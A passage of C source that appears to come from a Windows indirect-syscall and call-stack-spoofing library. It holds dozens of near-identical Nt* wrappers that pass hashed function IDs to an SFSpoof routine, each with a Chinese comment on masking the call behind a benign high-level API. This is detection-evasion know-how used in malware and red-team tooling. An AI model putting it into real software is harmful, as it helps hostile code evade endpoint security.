    Params.param[5] = (DWORD_PTR)ReceiveMessage;
    Params.param[6] = (DWORD_PTR)BufferLength;
    Params.param[7] = (DWORD_PTR)ReceiveMessageAttributes;
    Params.param[8] = (DWORD_PTR)Timeout;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 8;
    Params.FuncHash = 0x09F7DE6F1;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcSetInformation(HANDLE PortHandle, ALPC_PORT_INFORMATION_CLASS PortInformationClass, PVOID PortInformation, ULONG Length) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)PortInformationClass;
    Params.param[3] = (DWORD_PTR)PortInformation;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x01E7B649F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAreMappedFilesTheSame(PVOID File1MappedAsAnImage, PVOID File2MappedAsFile) {
    Params.param[1] = (DWORD_PTR)File1MappedAsAnImage;
    Params.param[2] = (DWORD_PTR)File2MappedAsFile;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0938DFC0F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAssignProcessToJobObject(HANDLE JobHandle, HANDLE ProcessHandle) {
    Params.param[1] = (DWORD_PTR)JobHandle;
    Params.param[2] = (DWORD_PTR)ProcessHandle;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x03A84063B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAssociateWaitCompletionPacket(HANDLE WaitCompletionPacketHandle, HANDLE IoCompletionHandle, HANDLE TargetObjectHandle, PVOID KeyContext, PVOID ApcContext, NTSTATUS IoStatus, DWORD_PTR IoStatusInformation, PBOOLEAN AlreadySignaled) {
    Params.param[1] = (DWORD_PTR)WaitCompletionPacketHandle;
    Params.param[2] = (DWORD_PTR)IoCompletionHandle;
    Params.param[3] = (DWORD_PTR)TargetObjectHandle;
    Params.param[4] = (DWORD_PTR)KeyContext;
    Params.param[5] = (DWORD_PTR)ApcContext;
    Params.param[6] = (DWORD_PTR)IoStatus;
    Params.param[7] = (DWORD_PTR)IoStatusInformation;
    Params.param[8] = (DWORD_PTR)AlreadySignaled;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 8;
    Params.FuncHash = 0x0393C33A2;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCallEnclave(PENCLAVE_ROUTINE Routine, PVOID Parameter, BOOLEAN WaitForThread, PVOID ReturnValue) {
    Params.param[1] = (DWORD_PTR)Routine;
    Params.param[2] = (DWORD_PTR)Parameter;
    Params.param[3] = (DWORD_PTR)WaitForThread;
    Params.param[4] = (DWORD_PTR)ReturnValue;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x09F309BDB;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCancelIoFileEx(HANDLE FileHandle, PIO_STATUS_BLOCK IoRequestToCancel, PIO_STATUS_BLOCK IoStatusBlock) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoRequestToCancel;
    Params.param[3] = (DWORD_PTR)IoStatusBlock;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0A95BFB86;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCancelSynchronousIoFile(HANDLE ThreadHandle, PIO_STATUS_BLOCK IoRequestToCancel, PIO_STATUS_BLOCK IoStatusBlock) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)IoRequestToCancel;
    Params.param[3] = (DWORD_PTR)IoStatusBlock;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x09604A6CE;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCancelTimer2(HANDLE TimerHandle, PT2_CANCEL_PARAMETERS Parameters) {
    Params.param[1] = (DWORD_PTR)TimerHandle;
    Params.param[2] = (DWORD_PTR)Parameters;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0099DE933;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCancelWaitCompletionPacket(HANDLE WaitCompletionPacketHandle, BOOLEAN RemoveSignaledPacket) {
    Params.param[1] = (DWORD_PTR)WaitCompletionPacketHandle;
    Params.param[2] = (DWORD_PTR)RemoveSignaledPacket;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0AB9F4AE3;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCommitComplete(HANDLE EnlistmentHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x040BC6C32;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCommitEnlistment(HANDLE EnlistmentHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x010B92F3A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCommitRegistryTransaction(HANDLE RegistryHandle, BOOL Wait) {
    Params.param[1] = (DWORD_PTR)RegistryHandle;
    Params.param[2] = (DWORD_PTR)Wait;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x002A821FD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCommitTransaction(HANDLE TransactionHandle, BOOLEAN Wait) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = (DWORD_PTR)Wait;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x03CA0DFB1;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCompactKeys(ULONG Count, HANDLE KeyArray) {
    Params.param[1] = (DWORD_PTR)Count;
    Params.param[2] = (DWORD_PTR)KeyArray;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x07BE01004;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCompareObjects(HANDLE FirstObjectHandle, HANDLE SecondObjectHandle) {
    Params.param[1] = (DWORD_PTR)FirstObjectHandle;
    Params.param[2] = (DWORD_PTR)SecondObjectHandle;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0115AE533;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCompareSigningLevels(ULONG UnknownParameter1, ULONG UnknownParameter2) {
    Params.param[1] = (DWORD_PTR)UnknownParameter1;
    Params.param[2] = (DWORD_PTR)UnknownParameter2;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0B288438B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCompareTokens(HANDLE FirstTokenHandle, HANDLE SecondTokenHandle, PBOOLEAN Equal) {
    Params.param[1] = (DWORD_PTR)FirstTokenHandle;
    Params.param[2] = (DWORD_PTR)SecondTokenHandle;
    Params.param[3] = (DWORD_PTR)Equal;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0DDB1B6A5;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCompleteConnectPort(HANDLE PortHandle) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0E6B2DF1C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCompressKey(HANDLE Key) {
    Params.param[1] = (DWORD_PTR)Key;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0171238B4;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtConnectPort(PHANDLE PortHandle, PUNICODE_STRING PortName, PSECURITY_QUALITY_OF_SERVICE SecurityQos, PPORT_SECTION_WRITE ClientView, PPORT_SECTION_READ ServerView, PULONG MaxMessageLength, PVOID ConnectionInformation, PULONG ConnectionInformationLength) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)PortName;
    Params.param[3] = (DWORD_PTR)SecurityQos;
    Params.param[4] = (DWORD_PTR)ClientView;
    Params.param[5] = (DWORD_PTR)ServerView;
    Params.param[6] = (DWORD_PTR)MaxMessageLength;
    Params.param[7] = (DWORD_PTR)ConnectionInformation;
    Params.param[8] = (DWORD_PTR)ConnectionInformationLength;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 8;
    Params.FuncHash = 0x062F27F5A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtConvertBetweenAuxiliaryCounterAndPerformanceCounter(ULONG UnknownParameter1, ULONG UnknownParameter2, ULONG UnknownParameter3, ULONG UnknownParameter4) {
    Params.param[1] = (DWORD_PTR)UnknownParameter1;
    Params.param[2] = (DWORD_PTR)UnknownParameter2;
    Params.param[3] = (DWORD_PTR)UnknownParameter3;
    Params.param[4] = (DWORD_PTR)UnknownParameter4;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0199A3327;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateDebugObject(PHANDLE DebugObjectHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)DebugObjectHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)Flags;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0A43CBE91;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateDirectoryObject(PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)DirectoryHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x01C86744D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateDirectoryObjectEx(PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ShadowDirectoryHandle, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)DirectoryHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)ShadowDirectoryHandle;
    Params.param[5] = (DWORD_PTR)Flags;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x06ACB547C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateEnclave(HANDLE ProcessHandle, PVOID BaseAddress, DWORD_PTR ZeroBits, SIZE_T Size, SIZE_T InitialCommitment, ULONG EnclaveType, PVOID EnclaveInformation, ULONG EnclaveInformationLength, PULONG EnclaveError) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)ZeroBits;
    Params.param[4] = (DWORD_PTR)Size;
    Params.param[5] = (DWORD_PTR)InitialCommitment;
    Params.param[6] = (DWORD_PTR)EnclaveType;
    Params.param[7] = (DWORD_PTR)EnclaveInformation;
    Params.param[8] = (DWORD_PTR)EnclaveInformationLength;
    Params.param[9] = (DWORD_PTR)EnclaveError;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x02254D5C4;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateEnlistment(PHANDLE EnlistmentHandle, ACCESS_MASK DesiredAccess, HANDLE ResourceManagerHandle, HANDLE TransactionHandle, POBJECT_ATTRIBUTES ObjectAttributes, ULONG CreateOptions, NOTIFICATION_MASK NotificationMask, PVOID EnlistmentKey) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ResourceManagerHandle;
    Params.param[4] = (DWORD_PTR)TransactionHandle;
    Params.param[5] = (DWORD_PTR)ObjectAttributes;
    Params.param[6] = (DWORD_PTR)CreateOptions;
    Params.param[7] = (DWORD_PTR)NotificationMask;
    Params.param[8] = (DWORD_PTR)EnlistmentKey;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 8;
    Params.FuncHash = 0x0FBA107CA;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateEventPair(PHANDLE EventPairHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)EventPairHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x09FB05DE7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateIRTimer(PHANDLE TimerHandle, ACCESS_MASK DesiredAccess) {
    Params.param[1] = (DWORD_PTR)TimerHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0A5A638AD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateIoCompletion(PHANDLE IoCompletionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG Count) {
    Params.param[1] = (DWORD_PTR)IoCompletionHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)Count;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0940D9265;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateJobObject(PHANDLE JobHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)JobHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x03EA0141D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateJobSet(ULONG NumJob, PJOB_SET_ARRAY UserJobSet, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)NumJob;
    Params.param[2] = (DWORD_PTR)UserJobSet;
    Params.param[3] = (DWORD_PTR)Flags;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0AE3EC723;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateKeyTransacted(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG TitleIndex, PUNICODE_STRING Class, ULONG CreateOptions, HANDLE TransactionHandle, PULONG Disposition) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)TitleIndex;
    Params.param[5] = (DWORD_PTR)Class;
    Params.param[6] = (DWORD_PTR)CreateOptions;
    Params.param[7] = (DWORD_PTR)TransactionHandle;
    Params.param[8] = (DWORD_PTR)Disposition;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 8;
    Params.FuncHash = 0x0C859D2E6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

